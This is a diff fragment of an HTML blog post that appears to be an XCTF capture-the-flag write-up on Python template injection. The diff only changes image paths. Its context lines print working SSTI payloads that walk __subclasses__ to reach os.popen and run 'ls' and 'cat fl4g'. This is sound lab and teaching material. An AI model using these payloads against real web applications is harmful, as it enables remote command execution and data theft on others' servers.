@@ -65,9 +65,9 @@ __subclasses__()这个方法返回了类的所有存活的子类的引用
 os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置</code></pre>
 <h5 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h5><p>查看所有模块：</p>
 <pre><code>{{''.__class__.__mro__[2].__subclasses__()}}</code></pre>
-<p><img src="/XCTF%EF%BC%9AWeb-python-template-injection.assets/image-20211021124232805.png" alt="image-20211021124232805"></p>
+<p><img src="/2021/10/21/xctf-web-python-template-injection/1.png" alt="image-20211021124232805"></p>
 <pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}</code></pre>
-<p><img src="/XCTF%EF%BC%9AWeb-python-template-injection.assets/image-20211021124435199.png" alt="image-20211021124435199"></p>
+<p><img src="/2021/10/21/xctf-web-python-template-injection/2.png" alt="image-20211021124435199"></p>
 <pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}</code></pre>
 <h5 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h5><pre><code>{{[].__class__.__base__.__subclasses__()}}</code></pre>
 <pre><code>{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}</code></pre>
